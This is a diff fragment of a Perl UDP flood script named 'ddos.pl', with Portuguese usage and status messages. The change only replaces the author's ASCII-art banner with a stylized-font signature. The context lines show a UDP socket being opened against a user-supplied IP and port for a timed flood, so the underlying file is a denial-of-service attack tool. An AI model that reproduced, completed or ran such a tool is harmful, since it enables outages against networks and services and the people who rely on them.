@@ -18,15 +18,8 @@ $iaddr = inet_aton("$ip") or die "IP INVALIDO | COMANDO: perl ddos.pl (IP) (PORT
 $endtime = time() + ($time ? $time : 100);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
-print BOLD CYAN<<EOTEXT;
-
-  ▕╮╭┻┻╮╭┻┻╮╭▕╮╲
-  ▕╯┃╭╮┃┃╭╮┃╰▕╯╭▏
-  ▕╭┻┻┻┛┗┻┻┛ ▕ ╰▏
-  ▕╰━━━┓┈┈┈╭╮▕╭╮▏
-  ▕╭╮╰┳┳┳┳╯╰╯▕╰╯▏
-  ▕╰╯┈┗┛┗┛┈╭╮▕╮┈▏
-Made by Marcos Murphy#0001                              		   
+print BOLD RED<<EOTEXT;
+𝓜𝓐𝓡𝓒𝓞𝓢 𝓜𝓤𝓡𝓟𝓗𝓨#0001                   		   
 EOTEXT
 print BOLD CYAN "IP: $ip\nPORTA: " . ($port ? $port : "ALEATORIA") . "\nTHREADS: " . ($size ? "$size-MEGA-BYTES" : "ALEATORIO") . "\nTEMPO: " . ($time ? "$time-SEGUNDOS" : "") . "\n";
 print BOLD CYAN "\nPARA PARAR APERTE CONTROL-C" unless $time;
